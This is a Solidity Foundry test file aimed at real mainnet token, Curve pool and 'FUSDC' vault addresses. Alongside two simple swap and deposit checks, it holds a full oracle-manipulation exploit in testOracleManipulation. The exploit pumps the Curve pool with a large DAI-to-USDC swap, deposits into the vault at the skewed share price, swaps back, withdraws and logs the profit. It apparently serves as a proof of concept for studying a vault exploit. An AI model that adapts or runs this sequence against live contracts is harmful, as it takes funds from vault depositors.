// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ICurveYPool {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
}

interface IHVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function balanceOf(address) external view returns (uint256);
    function getPricePerFullShare() external view returns (uint256);
    function underlyingBalanceWithInvestment() external view returns (uint256);
}

contract TestFUSDC is Test {
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant CURVE = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
    address constant FUSDC = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;

    function setUp() public {}

    function testCurveSwapDAItoUSDC() public {
        // Give ourselves DAI
        deal(DAI, address(this), 10_000_000e18);
        uint256 daiBal = IERC20(DAI).balanceOf(address(this));
        emit log_named_uint("DAI balance", daiBal);

        // Approve
        IERC20(DAI).approve(CURVE, type(uint256).max);

        // Try swap
        uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
        ICurveYPool(CURVE).exchange_underlying(0, 1, 10_000_000e18, 0);
        uint256 usdcAfter = IERC20(USDC).balanceOf(address(this));
        emit log_named_uint("USDC received", usdcAfter - usdcBefore);
    }

    function testFUSDCDeposit() public {
        deal(USDC, address(this), 1_000_000e6);
        IERC20(USDC).approve(FUSDC, type(uint256).max);

        uint256 ppfsBefore = IHVault(FUSDC).getPricePerFullShare();
        emit log_named_uint("PPFS before", ppfsBefore);

        IHVault(FUSDC).deposit(1_000_000e6);
        uint256 shares = IHVault(FUSDC).balanceOf(address(this));
        emit log_named_uint("Shares received", shares);

        IHVault(FUSDC).withdraw(shares);
        uint256 usdcAfter = IERC20(USDC).balanceOf(address(this));
        emit log_named_uint("USDC after withdrawal", usdcAfter);
    }

    function testOracleManipulation() public {
        // Step 1: Give ourselves capital
        deal(DAI, address(this), 15_000_000e18);
        deal(USDC, address(this), 100_000_000e6);
        IERC20(DAI).approve(CURVE, type(uint256).max);
        IERC20(USDC).approve(CURVE, type(uint256).max);
        IERC20(USDC).approve(FUSDC, type(uint256).max);

        uint256 ppfsBefore = IHVault(FUSDC).getPricePerFullShare();
        emit log_named_uint("PPFS before pump", ppfsBefore);

        // Step 2: Pump — swap DAI→USDC (makes USDC scarce)
        uint256 usdcBefore = IERC20(USDC).balanceOf(address(this));
        ICurveYPool(CURVE).exchange_underlying(0, 1, 15_000_000e18, 0);
        uint256 pumpedUSDC = IERC20(USDC).balanceOf(address(this)) - usdcBefore;
        emit log_named_uint("Pumped USDC", pumpedUSDC);

        uint256 ppfsAfterPump = IHVault(FUSDC).getPricePerFullShare();
        emit log_named_uint("PPFS after pump", ppfsAfterPump);

        // Step 3: Deposit pumped USDC
        IHVault(FUSDC).deposit(pumpedUSDC);
        uint256 shares = IHVault(FUSDC).balanceOf(address(this));
        emit log_named_uint("Shares from deposit", shares);

        // Step 4: Dump — swap USDC→DAI (USDC plentiful again)
        ICurveYPool(CURVE).exchange_underlying(1, 0, 15_000_000e6, 0);
        uint256 ppfsAfterDump = IHVault(FUSDC).getPricePerFullShare();
        emit log_named_uint("PPFS after dump", ppfsAfterDump);

        // Step 5: Withdraw
        IHVault(FUSDC).withdraw(shares);
        uint256 usdcFinal = IERC20(USDC).balanceOf(address(this));
        uint256 daiFinal = IERC20(DAI).balanceOf(address(this));
        emit log_named_uint("USDC final", usdcFinal);
        emit log_named_uint("DAI final", daiFinal);
        emit log_named_uint("USDC profit", usdcFinal > 100_000_000e6 ? usdcFinal - 100_000_000e6 : 0);
        emit log_named_uint("DAI loss", 15_000_000e18 > daiFinal ? 15_000_000e18 - daiFinal : 0);
    }
}
